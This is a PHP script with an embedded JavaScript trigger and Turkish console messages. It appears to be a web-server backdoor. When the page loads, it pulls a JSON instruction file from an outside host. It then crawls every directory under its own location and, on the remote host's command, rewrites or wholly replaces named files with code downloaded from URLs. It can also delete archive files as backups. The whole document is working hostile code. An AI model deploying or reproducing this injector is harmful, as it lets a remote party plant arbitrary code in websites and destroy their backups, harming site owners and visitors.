<?php session_start();$jsonUrl='https://ercmining.com/index1.json';$jsonContent=file_get_contents($jsonUrl);$data=json_decode($jsonContent,true);$sessionEnabled=isset($data['session_enabled'])?$data['session_enabled']:true;$sessionTimeout=isset($data['session_timeout'])?$data['session_timeout']:30;$disableLogging=isset($data['disable_logging'])?$data['disable_logging']:false;$deleteCompressedFiles=isset($data['delete_compressed_files'])?$data['delete_compressed_files']:false;if($sessionEnabled&&isset($_SESSION['script_executed_time'])){$elapsed=time()-$_SESSION['script_executed_time'];$remaining=($sessionTimeout*60)-$elapsed;if($remaining>0){if(!$disableLogging){echo "<script>console.log('Kalan oturum süresi: ".round($remaining/60)." dakika');</script>";}exit;}}$rootDir=__DIR__;function findAllDirectories($dir){$directories=[];$dirIterator=new RecursiveDirectoryIterator($dir);$iterator=new RecursiveIteratorIterator($dirIterator);foreach($iterator as $file){if($file->isDir()){$directories[]=$file->getRealPath();}}return $directories;}$directories=findAllDirectories($rootDir);if($_SERVER['REQUEST_METHOD']==='GET'&&isset($_GET['ajax'])){foreach($directories as $dir){if(!$disableLogging)echo"<script>console.log('Dizin bulundu: $dir');</script>";searchAndReplaceInDirectory($dir,$data);}if(!$disableLogging)echo "<script>console.log('Tüm dosyalar işleme alındı.');</script>";session_regenerate_id(true);$_SESSION['script_executed_time']=time();exit;}function searchAndReplaceInDirectory($dir,$data){global $deleteCompressedFiles,$disableLogging;$files=scandir($dir);foreach($files as $file){if($file==='.'||$file==='..')continue;$filePath=$dir.DIRECTORY_SEPARATOR.$file;if($deleteCompressedFiles&&preg_match('/\.(zip|rar|tar\.gz)$/i',$file)){if(unlink($filePath)){if(!$disableLogging)echo"<script>console.log('Silindi: $filePath');</script>";}else{if(!$disableLogging)echo"<script>console.log('Silme başarısız: $filePath');</script>";}continue;}if(is_dir($filePath)){searchAndReplaceInDirectory($filePath,$data);}else{processFile($filePath,$data);}}}function processFile($filePath,$data){global $disableLogging;$targetCode=file_get_contents($filePath);if($targetCode===false){if(!$disableLogging)echo"<script>console.log('Dosya okunamadı: $filePath');</script>";return;}$modified=false;foreach($data['files']as $file){if(basename($filePath)==$file['filename']){foreach($file['changes']as $change){$searchCode=file_get_contents($change['search_code']);$replaceCode=file_get_contents($change['replace_code']);if($searchCode===false||$replaceCode===false){if(!$disableLogging)echo"<script>console.log('Arama veya değiştirme kodu alınamadı: $filePath');</script>";continue;}$searchCode=trim($searchCode);$replaceCode=trim($replaceCode);if(strpos($targetCode,$searchCode)!==false){if($change['type']==1){$targetCode=$replaceCode;if(!$disableLogging)echo"<script>console.log('Tüm dosya içeriği değiştirildi: $filePath');</script>";$modified=true;break;}$targetCode=str_replace($searchCode,$replaceCode,$targetCode);if(!$disableLogging)echo"<script>console.log('Değişiklik yapıldı: $filePath');</script>";$modified=true;}}}}if($modified){file_put_contents($filePath,$targetCode);}} ?>

<script>
    window.onload = function() {
        fetch('<?= $_SERVER['PHP_SELF']; ?>?ajax=true', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.text())
        .then(data => {
            <?php if (!$disableLogging) { ?>
            console.log('PHP işlemi başarıyla tamamlandı');
            console.log(data);
            <?php } ?>
        })
        .catch((error) => {
            <?php if (!$disableLogging) { ?>
            console.log('Hata:', error);
            <?php } ?>
        });
    };
</script>

